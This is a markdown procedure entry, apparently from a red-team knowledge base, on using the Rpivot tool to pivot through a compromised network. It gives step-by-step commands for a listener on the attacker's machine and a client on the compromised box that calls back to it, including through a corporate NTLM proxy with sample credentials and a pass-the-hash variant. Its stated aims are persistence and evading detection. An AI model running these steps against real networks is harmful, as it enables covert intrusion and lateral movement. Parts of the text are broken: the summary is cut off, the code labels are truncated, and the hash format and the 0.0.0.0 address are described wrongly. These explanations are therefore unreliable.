---
id: abf1ed3d-b869-4709-9f6e-8369958744d1
name: Rpivot - Network Pivoting Techniques
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:22.876678+00:00'
updated_at: '2023-04-10T20:25:21.394156+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Connection Proxy|T1090 - Connection Proxy]]'
tags:
- '[[Network Pivoting Techniques]]'
- '[[Rpivot]]'
commands:
- '[[Run Python client with NTLM proxy]]'
- '[[Run Python client with NTLM proxy]]'
- '[[Start Python Client]]'
- '[[Start server with proxy port 1080, server port 9443, and IP 0.0.0.0]]'
---

# Rpivot - Network Pivoting Techniques

## Summary

Rpivot is a network pivoting technique that allows an attacker to maintain a foothold within a compromised network. Using a Python proxy server, the attacker can establish a connection to a compromised box and then pivot to other systems within the network. This technique can be used to maintain pe

## Description

# Description

Rpivot is a network pivoting technique that allows an attacker to maintain a foothold within a compromised network. Using a Python proxy server, the attacker can establish a connection to a compromised box and then pivot to other systems within the network. This technique can be used to maintain persistence and evade detection by using a corporate proxy connection.

From a technical standpoint, Rpivot works by creating a proxy server on the attacker's machine that listens for incoming connections from a compromised box client. Once a connection is established, the proxy server forwards traffic to the corporate proxy server, allowing the attacker to access other systems within the network. This technique can also be used in conjunction with a Pass the Hash attack to further evade detection.

The business value of Rpivot is that it allows an attacker to maintain access to a network even if the initial point of entry is discovered and remediated. This can allow the attacker to continue to exfiltrate data or carry out other malicious activities.

## Requirements

1. Compromised box client connection

1. Corporate proxy connection

1. Pass the Hash attack

## Defense

1. Monitor network traffic for suspicious activity

1. Use multi-factor authentication to prevent Pass the Hash attacks

1. Implement network segmentation to limit lateral movement

## Objectives

1. Maintain persistence within a compromised network

1. Evade detection by using a corporate proxy connection

1. Access other systems within the network

# Instructions

1. This command starts a Python proxy server on the attacker's machine. The server will listen on port 1080 for incoming proxy requests and will forward them to the target server at IP address 0.0.0.0 and port 9443. 

**Code**: [[python server.py --proxy-port 1080 --server-port 9]]

> The `--proxy-port` argument specifies the local port on which the proxy server will listen for incoming requests. The `--server-port` argument specifies the port on which the target server is listening. The `--server-ip` argument specifies the IP address of the target server. When a client sends a request to the proxy server, the server will forward the request to the target server and return the response to the client. This command can be used to intercept and modify network traffic between a client and a server.

**Command** ([[Start server with proxy port 1080, server port 9443, and IP 0.0.0.0]]):

```bash
python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
```

2. Use this command to connect to the server from a compromised box.

**Code**: [[python client.py --server-ip <ip> --server-port 94]]

> This command will start a Python client which will connect to the server using the provided IP address and port number. The compromised box can be used to execute commands on the server or to receive commands from the server. The IP address should be the IP address of the server and the port number should be the port number on which the server is listening. This command assumes that the client.py file is present in the current directory. If not, please provide the correct path to the file.

**Command** ([[Start Python Client]]):

```bash
python client.py --server-ip <ip> --server-port 9443
```

3. To establish a connection through a corporate proxy, use the following command:

**Code**: [[python client.py --server-ip [server ip] --server-]]

> This command is used to connect to a server through a corporate proxy. The `--server-ip` argument specifies the IP address of the server you want to connect to. The `--server-port` argument specifies the port number on which the server is listening. The `--ntlm-proxy-ip` argument specifies the IP address of the corporate proxy server. The `--ntlm-proxy-port` argument specifies the port number on which the corporate proxy server is listening. The `--domain` argument specifies the domain of the user account you want to use to authenticate with the server. The `--username` argument specifies the username of the user account you want to use to authenticate with the server. The `--password` argument specifies the password of the user account you want to use to authenticate with the server.

**Command** ([[Run Python client with NTLM proxy]]):

```bash
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

4. To perform a pass the hash attack, use the provided command and replace the necessary fields with the target server IP, proxy IP, domain, username, and the hash values. The hash values should be in the format NTLMv1:NTLMv2.

**Code**: [[python client.py --server-ip [server ip] --server-]]

> A pass the hash attack is a technique used to authenticate to a remote system or service by using the hash value of the user's password instead of the plaintext password. This attack is commonly used in situations where the attacker has already obtained the password hash of a user, but not the actual password. By using the hash value, the attacker can bypass authentication mechanisms that rely on the plaintext password, such as Kerberos or NTLM. The provided command can be used to perform a pass the hash attack against a target system using the NTLM protocol.

**Command** ([[Run Python client with NTLM proxy]]):

```bash
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] --ntlm-proxy-port 8080 --domain CORP --username jdoe --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Connection Proxy|T1090 - Connection Proxy]]

## Commands Used

- [[Run Python client with NTLM proxy]]
- [[Run Python client with NTLM proxy]]
- [[Start Python Client]]
- [[Start server with proxy port 1080, server port 9443, and IP 0.0.0.0]]

## Tags

- [[Network Pivoting Techniques]]
- [[Rpivot]]
